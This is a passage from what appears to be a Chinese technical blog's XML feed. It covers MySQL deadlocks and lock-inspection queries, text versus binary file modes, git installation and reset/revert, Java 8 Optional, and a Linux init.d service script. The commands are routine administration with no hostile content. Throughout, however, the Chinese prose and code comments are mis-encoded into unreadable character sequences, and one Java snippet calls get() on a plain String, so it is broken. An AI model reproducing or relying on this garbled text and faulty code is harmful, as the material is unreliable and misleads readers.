sid, create_at) <span class="keyword">values</span> (<span class="string">&#x27;us&#x27;</span>, <span class="number">102</span>, unix_timestamp(now()));</span><br></pre></td></tr></table></figure><table><thead><tr><th>Session A</th><th>Session B</th></tr></thead><tbody><tr><td>start transaction;</td><td>start transaction;</td></tr><tr><td>delete from question where source &#x3D; â€˜usâ€™ and sid &#x3D; 100;</td><td>delete from question where source &#x3D; â€˜usâ€™ and sid &#x3D; 101;</td></tr><tr><td>insert into question(source, sid, create_at) values (â€˜usâ€™, 100, unix_timestamp(now()));</td><td></td></tr><tr><td></td><td>insert into question(source, sid, create_at) values (â€˜usâ€™, 101, unix_timestamp(now()))</td></tr><tr><td></td><td>DEADLOCK</td></tr><tr><td>commit</td><td>commit</td></tr></tbody></table><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ol><li><p>æŸ¥çœ‹äº‹åŠ¡éš”ç¦»çº§åˆ«</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.tx_isolation;</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@session</span>.tx_isolation;</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@tx_isolation</span>;</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®éš”ç¦»çº§åˆ«</p><p> SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}<br> ä¾‹å¦‚ï¼šset session transaction isolation level read uncommitted;</p></li><li><p>æŸ¥çœ‹auto_incrementæœºåˆ¶æ¨¡å¼</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;innodb_autoinc_lock_mode&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹è¡¨çŠ¶æ€</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;plan_branch&#x27;</span>\G;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">from</span> test <span class="keyword">like</span> <span class="string">&#x27;plan_branch&#x27;</span>\G;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹SQLæ€§èƒ½</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> profiles</span><br><span class="line"><span class="keyword">show</span> profile <span class="keyword">for</span> query <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å½“å‰æœ€æ–°äº‹åŠ¡ID</p><p> æ¯å¼€å¯ä¸€ä¸ªæ–°äº‹åŠ¡ï¼Œè®°å½•å½“å‰æœ€æ–°äº‹åŠ¡çš„idï¼Œå¯ç”¨äºåç»­æ­»é”åˆ†æã€‚ </p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> engine innodb status\G;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹äº‹åŠ¡é”ç­‰å¾…çŠ¶æ€æƒ…å†µ</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># æ‰€æœ‰innodbæ­£åœ¨ç­‰å¾…çš„é”ï¼Œå’Œè¢«ç­‰å¾…çš„é”</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.innodb_locks;</span><br><span class="line"># æŸ¥çœ‹ç­‰å¾…é”çš„äº‹åŠ¡</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.innodb_lock_waits;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.innodb_trx;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹innodbçŠ¶æ€(åŒ…å«æœ€è¿‘çš„æ­»é”æ—¥å¿—)</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> engine innodb status;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹æ‰€æœ‰è¿æ¥</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> processlist;</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-transaction-isolation-levels.html">Transaction Isolation Levels</a></li><li><a href="https://ristret.com/s/f643zk/history_transaction_histories">A History of Transaction Histories</a></li><li><a href="http://hedengcheng.com/?p=771">MySQL åŠ é”å¤„ç†åˆ†æ</a></li><li><a href="http://www.fanyilun.me/2017/04/20/MySQL%E5%8A%A0%E9%94%81%E5%88%86%E6%9E%90">MySQLåŠ é”åˆ†æ</a></li><li><a href="http://yeshaoting.cn/article/database/mysql%20insert%E9%94%81%E6%9C%BA%E5%88%B6/">mysql inserté”æœºåˆ¶</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶æ¨¡å¼</title>
      <link href="/post/file-mode.html"/>
      <url>/post/file-mode.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶æ¨¡å¼"><a href="#æ–‡ä»¶æ¨¡å¼" class="headerlink" title="æ–‡ä»¶æ¨¡å¼"></a>æ–‡ä»¶æ¨¡å¼</h2><p>æ–‡ä»¶ I&#x2F;O æ“ä½œå°†åœ¨æ–‡æœ¬æˆ–äºŒè¿›åˆ¶è¿™ä¸¤ç§è½¬æ¢æ¨¡å¼ä¹‹ä¸€ä¸­è¿›è¡Œï¼Œå…·ä½“å–å†³äºæ–‡ä»¶æ—¶åœ¨å“ªç§æ¨¡å¼ä¸‹æ‰“å¼€çš„ã€‚æ•°æ®æ–‡ä»¶é€šå¸¸åœ¨æ–‡æœ¬æ¨¡å¼ä¸‹å¤„ç†ï¼Œè¿™å¯ä»¥ç»™æˆ‘ä»¬æä¾›ä¸€ä¸‹ä¾¿åˆ©çš„æ“ä½œã€‚</p><h3 id="äºŒè¿›åˆ¶æ¨¡å¼ä¸æ–‡æœ¬æ¨¡å¼"><a href="#äºŒè¿›åˆ¶æ¨¡å¼ä¸æ–‡æœ¬æ¨¡å¼" class="headerlink" title="äºŒè¿›åˆ¶æ¨¡å¼ä¸æ–‡æœ¬æ¨¡å¼"></a>äºŒè¿›åˆ¶æ¨¡å¼ä¸æ–‡æœ¬æ¨¡å¼</h3><p>ç‰©ç†ä¸Šè®¡ç®—æœºä¸Šæ‰€æœ‰çš„æ–‡ä»¶éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶æ–¹å¼å­˜å‚¨çš„ã€‚å¦‚æœæˆ‘ä»¬çŸ¥é“æ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–‡æœ¬æ¨¡å¼è¯»å†™æ–‡ä»¶ã€‚æ–‡æœ¬æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥è¡Œä¸ºå•ä½è¯»å–å†™å…¥ï¼Œä¸ç„¶æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å»å¤„ç†æ¢è¡Œç¬¦ã€‚</p><p>åœ¨äºŒè¿›åˆ¶æ¨¡å¼ä¸‹æ¢è¡Œç¬¦ä¼šä½œä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œæ–‡æœ¬æ¨¡å¼ä¸‹è¯»å–æ—¶ä¼šå¿½ç•¥æ¢è¡Œç¬¦ã€‚</p><p>æ–‡æœ¬æ–‡ä»¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå¯¹â€™\nâ€™è¿›è¡Œä¸€äº›éšå¼å˜æ¢ï¼Œå› æ­¤æ–‡æœ¬æ–‡ä»¶ç›´æ¥è·¨å¹³å°ä½¿ç”¨ä¼šå‡ºé—®é¢˜ã€‚</p><ul><li>åœ¨Windowsä¸‹ï¼Œå†™å…¥<code>\n</code>æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šéšå¼çš„å°†<code>\n</code>è½¬æ¢ä¸º<code>\r\n</code>ï¼Œå†å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼›è¯»çš„æ—¶å€™ï¼Œä¼šæŠŠ<code>\r\n</code>éšå¼è½¬åŒ–ä¸º<code>\n</code>ï¼Œå†è¯»åˆ°å˜é‡ä¸­ã€‚</li><li>åœ¨Linuxä¸‹ï¼Œå†™å…¥<code>\n</code>æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¸åšéšå¼å˜æ¢ã€‚</li></ul><p>äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ“ä½œç³»ç»Ÿä¸ä¼šå¯¹â€™\nâ€™è¿›è¡Œéšå¼å˜æ¢ï¼Œå¾ˆå¤šäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚ç”µå½±ã€å›¾ç‰‡ç­‰ï¼‰å¯ä»¥è·¨å¹³å°ä½¿ç”¨ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨æ–‡æœ¬æ¨¡å¼<strong>å…ˆè¯»åå†™</strong>äºŒè¿›åˆ¶æ–‡ä»¶å¯èƒ½ç…§æˆæ–‡ä»¶æŸåã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬è¯»å–ä¸€å¼ å›¾ç‰‡ï¼Œå¦‚æœæ˜¯æ–‡æœ¬æ¨¡å¼(readLine)å°±ä¼šç›´åˆ°é‡åˆ°<code>\n</code>è¿™ä¸ªå­—ç¬¦ä¸€æ¬¡è¯»å–æ‰ç»“æŸã€‚ä½†æ˜¯ï¼Œå®é™…ä¸Š<code>\n</code>è¿™ä¸ªå­—ç¬¦ä¸åƒåœ¨æ–‡æœ¬ä¸­å…·æœ‰ç‰¹æ®Šæ„ä¹‰ï¼Œè¿™ç§è¯»å–æ–¹å¼æ˜¯æ¯«æ— æ„ä¹‰çš„ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/text-and-binary-mode-file-i-o">æ–‡æœ¬å’ŒäºŒè¿›åˆ¶æ¨¡å¼æ–‡ä»¶ I&#x2F;O</a></li><li><a href="http://blog.csdn.net/timberwolf_2012/article/details/28499615">æ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶æ¯”è¾ƒ</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> file </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/post/git.html"/>
      <url>/post/git.html</url>
      
        <content type="html"><![CDATA[<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><ol><li><a href="https://github.com/git/git/releases">ä¸‹è½½</a>æœ€æ–°ç‰ˆ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/git/git/archive/v2.13.2.tar.gz</span><br><span class="line">tar -zxf v2.13.2.tar.gz</span><br></pre></td></tr></table></figure><ol start="2"><li>ç¼–è¯‘å®‰è£…</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel  </span><br><span class="line"></span><br><span class="line">sudo make prefix=/usr/local install</span><br></pre></td></tr></table></figure><blockquote><p>æŒ‡å®š prefix ä¸º &#x2F;usr&#x2F;local ä¼šå®‰è£…åˆ° &#x2F;usr&#x2F;local&#x2F;bin ä¸‹ï¼ŒæŒ‡å®š prefix ä¸º &#x2F;use ä¼šå®‰è£…åˆ°&#x2F;usr&#x2F;bin ä¸‹ã€‚</p></blockquote><h3 id="ç§æœ‰gitä»“åº“"><a href="#ç§æœ‰gitä»“åº“" class="headerlink" title="ç§æœ‰gitä»“åº“"></a>ç§æœ‰gitä»“åº“</h3><p><a href="https://www.liaoxuefeng.com/article/001373894410719a19c79d040c84fd4a7492efc60081be1000">https://www.liaoxuefeng.com/article/001373894410719a19c79d040c84fd4a7492efc60081be1000</a></p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><ol><li><p>è®¾ç½®ä»£ç†</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line">git config --global --unset http.proxy</span><br></pre></td></tr></table></figure></li><li><p>ä¸­æ–‡ç¼–ç </p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.quotepath false</span><br></pre></td></tr></table></figure></li></ol><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><h4 id="revert"><a href="#revert" class="headerlink" title="revert"></a>revert</h4><p><code>revert</code>ä¼šä¸¢å¼ƒæ‰æäº¤ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªæ–°çš„<code>commit</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git revert HEAD # ä¸¢å¼ƒæ‰æœ€æ–°çš„æäº¤</span><br><span class="line">git revert HEAD^ æˆ– git git revert HEAD~1 # ä¸¢å¼ƒæ‰å€’æ•°ç¬¬äºŒæ¬¡æäº¤ HEAD^^å€’æ•°ç¬¬ä¸‰æ¬¡ï¼Œç­‰åŒäºHEAD~2</span><br><span class="line">git revert bb72c804 # ä¸¢å¼ƒæ‰æäº¤</span><br></pre></td></tr></table></figure><h4 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h4><p><code>reset</code>æ¢å¤ä¸ºæŸæ¬¡æäº¤ï¼Œåé¢çš„å˜æ›´ä¼šå…¨éƒ¨ä¸¢å¼ƒæ‰ã€‚</p><ul><li>â€“soft â€“ ç¼“å­˜åŒºå’Œå·¥ä½œç›®å½•éƒ½ä¸ä¼šè¢«æ”¹å˜ã€‚</li><li>â€“mixed â€“ é»˜è®¤é€‰é¡¹ã€‚ç¼“å­˜åŒºå’Œä½ æŒ‡å®šçš„æäº¤åŒæ­¥ï¼Œä½†<code>å·¥ä½œç›®å½•</code>ä¸å—å½±å“ã€‚</li><li>â€“hard â€“ ç¼“å­˜åŒºå’Œ<code>å·¥ä½œç›®å½•</code>éƒ½åŒæ­¥åˆ°ä½ æŒ‡å®šçš„æäº¤ã€‚<blockquote><p>å¦‚æœæäº¤å·²ç»æ¨é€åˆ°è¿œç«¯ä»“åº“ï¼Œ<code>reset</code>å<code>push</code>æ—¶éœ€è¦å¼ºåˆ¶è¦†ç›–<code>-f</code>ã€‚</p></blockquote></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^ # æ¢å¤åˆ°ä¸Šæ¬¡æäº¤</span><br><span class="line">git reset --hard bb72c804 # å›å¤åˆ°bb72c804</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://github.com/geeeeeeeeek/git-recipes/wiki/5.2-%E4%BB%A3%E7%A0%81%E5%9B%9E%E6%BB%9A%EF%BC%9AReset%E3%80%81Checkout%E3%80%81Revert-%E7%9A%84%E9%80%89%E6%8B%A9">ä»£ç å›æ»šï¼šResetã€Checkoutã€Revert çš„é€‰æ‹©</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 Optional</title>
      <link href="/post/java8-optional.html"/>
      <url>/post/java8-optional.html</url>
      
        <content type="html"><![CDATA[<h2 id="Java-Optional"><a href="#Java-Optional" class="headerlink" title="Java Optional"></a>Java Optional</h2><p><code>Optional</code>ç±»æ˜¯ä¸ºäº†é¿å…ç©ºæŒ‡é’ˆé—®é¢˜åœ¨Java8ä¸­æ–°å¢çš„ä¸€ä¸ªç±»ã€‚<code>Optional</code>å¹¶ä¸æ˜¯çœŸæ­£é¿å…é¿å…ç©ºæŒ‡é’ˆçš„ï¼Œä»–åªæ˜¯ç”¨æ¥<code>æé†’</code>æˆ‘ä»¬éœ€è¦æ³¨æ„ç©ºæŒ‡é’ˆé—®é¢˜ï¼Œæˆ‘ä»¬åº”è¯¥å…ˆè°ƒç”¨å®ƒçš„<code>isPresent()</code>å‘æ”¾å»æ£€æŸ¥ä¸€ä¸‹å®é™…çš„å€¼æ˜¯ä¸æ˜¯ç©ºã€‚</p><p>å‡½æ•°è¿”å›å€¼ï¼Œæˆ‘ä»¬æ—¶å¸¸ä¼šå¿˜è®°åˆ¤æ–­è¿”å›å€¼æ˜¯ä¸æ˜¯ç©ºã€‚å¦‚æœè¿”å›å€¼æ˜¯<code>Optional&lt;T&gt;</code>ç±»å‹ï¼Œè¿™ä¼šæé†’æˆ‘ä»¬å»æ£€æŸ¥ã€‚</p><blockquote><p>æ³¨æ„ï¼šå¦‚æœè¿”å›å€¼æ˜¯<code>Optional&lt;T&gt;</code>ç±»å‹ï¼Œæˆ‘ä»¬éƒ½ä¼šå‡å®šè¿™ä¸ªè¿”å›å€¼ä¸å¯èƒ½æ˜¯<code>null</code>ï¼Œä¸ç„¶<code>Optional</code>ç±»å°±æ¯«æ— æ„ä¹‰äº†ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> doSomething();</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">null</span> != str) System.out.print(str.get().length());</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäºå¦‚ä¸‹</span></span><br><span class="line"></span><br><span class="line">Optional&lt;String&gt; str = doSomething(); <span class="comment">// å‡å®šsträ¸å¯èƒ½æ˜¯null</span></span><br><span class="line"><span class="keyword">if</span> (str.isPresent()) System.out.print(str.get().length());</span><br></pre></td></tr></table></figure><h3 id="Optional-ç±»ä½¿ç”¨è¯´æ˜"><a href="#Optional-ç±»ä½¿ç”¨è¯´æ˜" class="headerlink" title="Optional ç±»ä½¿ç”¨è¯´æ˜"></a>Optional ç±»ä½¿ç”¨è¯´æ˜</h3><p><a href="http://www.importnew.com/6675.html">Java 8 Optionalç±»æ·±åº¦è§£æ</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LinuxæœåŠ¡</title>
      <link href="/post/linux-service.html"/>
      <url>/post/linux-service.html</url>
      
        <content type="html"><![CDATA[<h2 id="LinuxæœåŠ¡"><a href="#LinuxæœåŠ¡" class="headerlink" title="LinuxæœåŠ¡"></a>LinuxæœåŠ¡</h2><p>LinuxæœåŠ¡è„šæœ¬ä½äº<code>/etc/rc.d/init.d</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„shellè„šæœ¬ã€‚</p><h3 id="æ ‡å‡†ç»“æ„"><a href="#æ ‡å‡†ç»“æ„" class="headerlink" title="æ ‡å‡†ç»“æ„"></a>æ ‡å‡†ç»“æ„</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">chkconfig: 2345 20 80</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">description: Customized service</span></span><br><span class="line"></span><br><span class="line">start() &#123;</span><br><span class="line">    echo &#x27;This is my service, start command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop() &#123;</span><br><span class="line">    echo &#x27;This is my service, stop command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">restart() &#123;</span><br><span class="line">    echo &#x27;This is my service, restart command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status() &#123;</span><br><span class="line">    echo &#x27;This is my service, status command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">    start)</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        stop</span><br><span class="line">        ;;</span><br><span class="line">    restart)</span><br><span class="line">        restart</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        status</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        echo &#x27;Usage: service myservice &#123;start|status|stop|restart&#125;&#x27;</span><br><span class="line">        ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><blockquote><p><code>chkconfig: 2345 20 80</code> (è¿™é‡Œä½œä¸€ä¸‹ç‰¹æ®Šè¯´æ˜: <code>20</code> æ˜¯è¯¥ç¨‹åºå¼€æœºçš„å¯åŠ¨ä¼˜å…ˆçº§ï¼Œå€¼è¶Šå°è¶Šä¼˜å…ˆï¼›<code>80</code>æ˜¯å…³æœºæ—¶çš„ä¼˜å…ˆçº§ï¼Œå€¼è¶Šå°è¶Šå…ˆå…³é—­ï¼›è¿™é‡Œå°±å¯ä»¥è®¾å®šlinuxå€¼çš„å¼€å…³æœºé¡ºåºäº†ï¼‰ã€‚å¦‚æœæŸæœåŠ¡ç¼ºçœä¸åœ¨ä»»ä½•è¿è¡Œçº§å¯åŠ¨ï¼Œé‚£ä¹ˆä½¿ç”¨ <code>-</code> ä»£æ›¿è¿è¡Œçº§ã€‚</p></blockquote><h3 id="Linux-è¿›ç¨‹è¿è¡Œçš„7ä¸ªç­‰çº§"><a href="#Linux-è¿›ç¨‹è¿è¡Œçš„7ä¸ªç­‰çº§" class="headerlink" title="Linux è¿›ç¨‹è¿è¡Œçš„7ä¸ªç­‰çº§"></a>Linux è¿›ç¨‹è¿è¡Œçš„7ä¸ªç­‰çº§</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¿è¡Œçº§åˆ«0ï¼šç³»ç»ŸåœæœºçŠ¶æ€ï¼Œç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º0ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨</span><br><span class="line">è¿è¡Œçº§åˆ«1ï¼šå•ç”¨æˆ·å·¥ä½œçŠ¶æ€ï¼Œrootæƒé™ï¼Œç”¨äºç³»ç»Ÿç»´æŠ¤ï¼Œç¦æ­¢è¿œç¨‹ç™»å½•</span><br><span class="line">è¿è¡Œçº§åˆ«2ï¼šå¤šç”¨æˆ·çŠ¶æ€(æ²¡æœ‰NFS)</span><br><span class="line">è¿è¡Œçº§åˆ«3ï¼šå®Œå…¨çš„å¤šç”¨æˆ·çŠ¶æ€(æœ‰NFS)ï¼Œç™»å½•åè¿›å…¥æ§åˆ¶å°å‘½ä»¤è¡Œæ¨¡å¼</span><br><span class="line">è¿è¡Œçº§åˆ«4ï¼šç³»ç»Ÿæœªä½¿ç”¨ï¼Œä¿ç•™</span><br><span class="line">è¿è¡Œçº§åˆ«5ï¼šX11æ§åˆ¶å°ï¼Œç™»å½•åè¿›å…¥å›¾å½¢GUIæ¨¡å¼</span><br><span class="line">è¿è¡Œçº§åˆ«6ï¼šç³»ç»Ÿæ­£å¸¸å…³é—­å¹¶é‡å¯ï¼Œé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º6ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><h4 id="æ³¨å†ŒæœåŠ¡"><a href="#æ³¨å†ŒæœåŠ¡" class="headerlink" title="æ³¨å†ŒæœåŠ¡"></a>æ³¨å†ŒæœåŠ¡</h4><blockquote><p>éœ€è¦ç»™äºˆè„šæœ¬æ‰§è¡Œæƒé™<code>chmod +x myservice</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add myservice</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤æœåŠ¡"><a href="#åˆ é™¤æœåŠ¡" class="headerlink" title="åˆ é™¤æœåŠ¡"></a>åˆ é™¤æœåŠ¡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --del myservice</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®å¯åŠ¨ç­‰çº§"><a href="#è®¾ç½®å¯åŠ¨ç­‰çº§" class="headerlink" title="è®¾ç½®å¯åŠ¨ç­‰çº§"></a>è®¾ç½®å¯åŠ¨ç­‰çº§</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level &lt;1-6&gt;] myservice [on/off/reset]</span><br><span class="line"># e.g.</span><br><span class="line">chkconfig --level 35 mysqld on</span><br></pre></td></tr></table></figure><h4 id="æœåŠ¡åˆ—è¡¨"><a href="#æœåŠ¡åˆ—è¡¨" class="headerlink" title="æœåŠ¡åˆ—è¡¨"></a>æœåŠ¡åˆ—è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list [name]</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td 